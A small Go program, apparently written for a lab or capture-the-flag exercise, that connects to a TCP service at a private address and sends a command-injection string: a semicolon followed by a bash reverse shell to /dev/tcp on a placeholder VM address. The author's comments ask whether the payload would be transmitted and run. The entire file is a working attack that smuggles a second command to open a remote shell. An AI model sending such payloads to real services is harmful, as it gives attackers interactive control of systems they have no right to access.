package main

import (
	"fmt"
	"net"
)

func main() {
	// Connect to the server
	conn, err := net.Dial("tcp", "10.76.165.15:9803") //This needs to be changed for the right port
	if err != nil {
		fmt.Println(err)
		return
	}

	_, err = conn.Write([]byte("; bash -i >& /dev/tcp/REPLACE WITH VM IP/9005 0>&1")) //Could this be transmitted and ran?

	if err != nil {
		fmt.Println("BROKE")
		return
	}
	conn.Close()
}
